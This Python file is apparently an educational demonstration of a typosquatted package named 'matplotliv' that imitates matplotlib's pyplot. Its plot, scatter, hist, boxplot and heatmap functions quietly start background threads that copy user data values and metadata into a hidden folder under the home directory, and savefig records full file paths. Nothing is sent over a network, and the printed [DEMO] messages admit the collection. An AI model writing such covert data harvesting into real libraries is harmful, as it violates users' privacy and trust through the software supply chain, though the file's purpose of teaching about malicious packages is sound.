"""
Enhanced pyplot module for matplotliv - EDUCATIONAL SECURITY DEMONSTRATION
Shows more sophisticated data exfiltration techniques
"""

import os
import json
import base64
import threading
from datetime import datetime

# Enhanced malicious functionality
def _detailed_data_analysis(data, metadata):
    """
    EDUCATIONAL DEMO: Shows how malicious packages can perform detailed analysis
    of user data before exfiltration
    """
    try:
        if not data:
            return
            
        analysis = {
            "timestamp": datetime.now().isoformat(),
            "data_type": type(data).__name__,
            "data_length": len(data) if hasattr(data, '__len__') else 0,
            "metadata": metadata,
        }
        
        # Analyze data characteristics
        if hasattr(data, '__iter__'):
            try:
                flat_data = [x for x in data if isinstance(x, (int, float))]
                if flat_data:
                    analysis.update({
                        "min_value": min(flat_data),
                        "max_value": max(flat_data),
                        "avg_value": sum(flat_data) / len(flat_data),
                        "data_range": max(flat_data) - min(flat_data),
                        "sample_values": flat_data[:5]  # First 5 values
                    })
            except:
                pass
        
        # Save analysis
        demo_dir = os.path.expanduser("~/demo_collected_data")
        os.makedirs(demo_dir, exist_ok=True)
        
        log_file = os.path.join(demo_dir, "data_analysis.json")
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                logs = json.load(f)
        else:
            logs = []
            
        logs.append(analysis)
        
        with open(log_file, "w") as f:
            json.dump(logs, f, indent=2)
            
        print(f"[DEMO] Enhanced data analysis completed for {len(flat_data) if 'flat_data' in locals() else 0} values")
        
    except Exception:
        pass

# Enhanced plotting functions with more sophisticated data collection
def plot(x, y=None, *args, **kwargs):
    """Enhanced plot function with detailed data analysis"""
    if y is not None:
        thread = threading.Thread(target=_detailed_data_analysis, args=(y, {"function": "plot", "has_labels": "label" in kwargs}))
    else:
        thread = threading.Thread(target=_detailed_data_analysis, args=(x, {"function": "plot", "single_array": True}))
    
    thread.daemon = True
    thread.start()
    
    print("[DEMO] Enhanced plot created with detailed analysis")
    return "<EnhancedPlotObject>"

def scatter(x, y, c=None, s=None, *args, **kwargs):
    """Enhanced scatter with color and size data collection"""
    scatter_data = {
        "x_data": list(x) if hasattr(x, '__iter__') else [x],
        "y_data": list(y) if hasattr(y, '__iter__') else [y],
        "color_data": list(c) if c is not None and hasattr(c, '__iter__') else None,
        "size_data": list(s) if s is not None and hasattr(s, '__iter__') else None,
    }
    
    thread = threading.Thread(target=_detailed_data_analysis, args=(scatter_data, {"function": "scatter", "has_color": c is not None}))
    thread.daemon = True
    thread.start()
    
    print("[DEMO] Enhanced scatter plot with color/size data analysis")
    return "<EnhancedScatterObject>"

def histogram(data, bins=50, *args, **kwargs):
    """Enhanced histogram - particularly dangerous for sensitive numerical data"""
    thread = threading.Thread(target=_detailed_data_analysis, args=(data, {"function": "histogram", "bins": bins, "potentially_sensitive": True}))
    thread.daemon = True
    thread.start()
    
    print(f"[DEMO] Enhanced histogram analysis - {len(data) if hasattr(data, '__len__') else 0} data points")
    return "<EnhancedHistogramObject>"

# Alias to match matplotlib
hist = histogram

def boxplot(data, *args, **kwargs):
    """Enhanced boxplot - often contains business-critical statistical data"""
    thread = threading.Thread(target=_detailed_data_analysis, args=(data, {"function": "boxplot", "statistical_analysis": True}))
    thread.daemon = True
    thread.start()
    
    print("[DEMO] Enhanced boxplot with statistical analysis")
    return "<EnhancedBoxplotObject>"

def heatmap(data, *args, **kwargs):
    """Enhanced heatmap - can reveal correlations and patterns in sensitive data"""
    # Flatten 2D data for analysis
    flat_data = []
    if hasattr(data, '__iter__'):
        for row in data:
            if hasattr(row, '__iter__'):
                flat_data.extend(row)
            else:
                flat_data.append(row)
    
    thread = threading.Thread(target=_detailed_data_analysis, args=(flat_data, {"function": "heatmap", "matrix_analysis": True, "shape": getattr(data, 'shape', 'unknown')}))
    thread.daemon = True
    thread.start()
    
    print("[DEMO] Enhanced heatmap with correlation analysis")
    return "<EnhancedHeatmapObject>"

# Standard matplotlib-like functions
def figure(figsize=None, dpi=None):
    print(f"[DEMO] Enhanced figure created {figsize}")
    return "<EnhancedFigureObject>"

def subplot(*args):
    print(f"[DEMO] Enhanced subplot {args}")
    return "<EnhancedSubplotObject>"

def show():
    print("[DEMO] Enhanced display with performance metrics")

def savefig(filename, *args, **kwargs):
    # Log file operations with more detail
    file_info = {
        "timestamp": datetime.now().isoformat(),
        "filename": filename,
        "full_path": os.path.abspath(filename),
        "file_size_estimate": "unknown",
        "format": os.path.splitext(filename)[1],
        "directory_writable": os.access(os.path.dirname(os.path.abspath(filename)) or ".", os.W_OK)
    }
    
    demo_dir = os.path.expanduser("~/demo_collected_data")
    os.makedirs(demo_dir, exist_ok=True)
    
    with open(os.path.join(demo_dir, "enhanced_file_ops.json"), "a") as f:
        f.write(json.dumps(file_info) + "\n")
    
    print(f"[DEMO] Enhanced save operation to {filename}")

# Additional convenience functions
xlabel = lambda label: print(f"[DEMO] Enhanced xlabel: {label}")
ylabel = lambda label: print(f"[DEMO] Enhanced ylabel: {label}")
title = lambda title: print(f"[DEMO] Enhanced title: {title}")
legend = lambda: print("[DEMO] Enhanced legend")
grid = lambda: print("[DEMO] Enhanced grid")
close = lambda: print("[DEMO] Enhanced close")